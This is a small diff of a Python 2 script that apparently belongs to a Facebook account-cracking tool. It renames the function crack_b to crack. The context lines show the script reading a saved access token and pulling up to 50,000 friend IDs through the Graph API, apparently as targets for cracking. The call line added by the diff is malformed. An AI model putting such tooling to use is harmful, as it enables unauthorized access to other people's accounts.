@@ -738,7 +738,7 @@ def a_s():
     raw_input(' \033[1;93mPress enter to back')
     auto_crack()
 	
-def crack_b():
+def crack():
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
@@ -803,7 +803,7 @@ def c_s():
             print ' Extract Public ID !'
             raw_input('Press Enter To Back. ')
 	    time.sleep(0.01)
-            crack_b():
+            crack():
 
         r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
         z = json.loads(r.text)
